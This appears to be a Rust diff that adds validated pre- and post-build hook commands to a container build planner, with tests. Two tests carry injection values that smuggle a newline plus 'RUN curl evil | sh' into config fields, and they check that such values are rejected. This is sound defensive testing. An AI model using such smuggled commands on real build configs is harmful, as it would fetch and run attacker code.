@@ -38,6 +38,10 @@ pub struct BuildOverrides {
     pub paths: Vec<String>,
     /// `BuildKit` secret ids to expose to build-stage commands.
     pub secrets: Vec<String>,
+    /// Commands to run at the start of the build stage, before provider steps.
+    pub pre_build: Vec<String>,
+    /// Commands to run at the end of the build stage, after provider steps.
+    pub post_build: Vec<String>,
 }
 
 impl BuildOverrides {
@@ -70,6 +74,12 @@ impl BuildOverrides {
         if self.secrets.is_empty() {
             self.secrets = lower.secrets;
         }
+        if self.pre_build.is_empty() {
+            self.pre_build = lower.pre_build;
+        }
+        if self.post_build.is_empty() {
+            self.post_build = lower.post_build;
+        }
         self
     }
 
@@ -95,6 +105,10 @@ impl BuildOverrides {
             build_image: get("KILN_BUILD_IMAGE"),
             paths: get("KILN_PATHS").map(split).unwrap_or_default(),
             secrets: get("KILN_SECRETS").map(split).unwrap_or_default(),
+            // Build hooks are multi-command and expressed in the config file, not
+            // via environment variables.
+            pre_build: Vec::new(),
+            post_build: Vec::new(),
         }
     }
 
@@ -213,6 +227,8 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     let build_image = overrides.build_image.clone();
     let paths = overrides.paths.clone();
     let secrets = overrides.secrets.clone();
+    let pre_build = overrides.pre_build.clone();
+    let post_build = overrides.post_build.clone();
     let ctx = AppContext::with_overrides(root, overrides)?;
 
     let mut plan = if let Some(name) = forced_provider {
@@ -238,6 +254,9 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
         plan.port = Some(port);
     }
     plan.env = env;
+    // Hooks first, then apt: apt is inserted at the front, so it lands ahead of
+    // any pre-build hook, giving the build order [apt, pre_build, provider, post_build].
+    apply_build_hooks(&mut plan, &pre_build, &post_build)?;
     apply_apt_packages(&mut plan, &build_apt, &deploy_apt)?;
     apply_base_images(&mut plan, build_image, runtime_image)?;
     for path in &paths {
@@ -250,6 +269,36 @@ pub fn detect_and_plan_with(root: impl AsRef<Path>, overrides: BuildOverrides) -
     plan.secrets = secrets;
 
     Ok(plan)
+}
+
+/// Insert user build hooks into the first stage: `pre` commands run before the
+/// provider's own steps, `post` commands after. Each becomes its own `RUN` line.
+/// A command may not be blank or contain a newline, which would split the line.
+fn apply_build_hooks(plan: &mut BuildPlan, pre: &[String], post: &[String]) -> Result<()> {
+    if pre.is_empty() && post.is_empty() {
+        return Ok(());
+    }
+    for command in pre.iter().chain(post) {
+        if command.trim().is_empty() || command.contains(['\n', '\r']) {
+            return Err(Error::UnsafeValue {
+                field: "build hook command",
+                value: command.clone(),
+            });
+        }
+    }
+    let hook = |command: &String| crate::plan::Command {
+        run: command.clone(),
+        cache_mounts: Vec::new(),
+    };
+    if let Some(stage) = plan.stages.first_mut() {
+        for (offset, command) in pre.iter().enumerate() {
+            stage.commands.insert(offset, hook(command));
+        }
+        for command in post {
+            stage.commands.push(hook(command));
+        }
+    }
+    Ok(())
 }
 
 /// Override the build and/or runtime stage base images with validated refs.
@@ -482,6 +531,46 @@ mod tests {
         std::fs::write(
             dir.path().join("kiln.json"),
             r#"{"runtime_image":"img\nRUN curl evil | sh"}"#,
+        )
+        .unwrap();
+        assert!(detect_and_plan(dir.path()).is_err());
+    }
+
+    #[test]
+    fn build_hooks_run_before_and_after_provider_steps() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            r#"{"pre_build":["echo pre","protoc gen"],"post_build":["strip /bin/app"]}"#,
+        )
+        .unwrap();
+        let plan = detect_and_plan(dir.path()).unwrap();
+        let runs: Vec<&str> = plan
+            .stages
+            .first()
+            .unwrap()
+            .commands
+            .iter()
+            .map(|c| c.run.as_str())
+            .collect();
+
+        let pre = runs.iter().position(|r| r.contains("echo pre")).unwrap();
+        let build = runs.iter().position(|r| r.contains("go build")).unwrap();
+        let post = runs.iter().position(|r| r.contains("strip /bin/app")).unwrap();
+        assert!(pre < build, "pre_build runs before the provider build: {runs:?}");
+        assert!(build < post, "post_build runs after the provider build: {runs:?}");
+        // hooks preserve their given order
+        assert!(runs.iter().position(|r| r.contains("protoc gen")).unwrap() > pre);
+    }
+
+    #[test]
+    fn build_hook_with_newline_is_rejected() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("go.mod"), "module example.com/app\n").unwrap();
+        std::fs::write(
+            dir.path().join("kiln.json"),
+            "{\"pre_build\":[\"echo a\\nRUN curl evil | sh\"]}",
         )
         .unwrap();
         assert!(detect_and_plan(dir.path()).is_err());
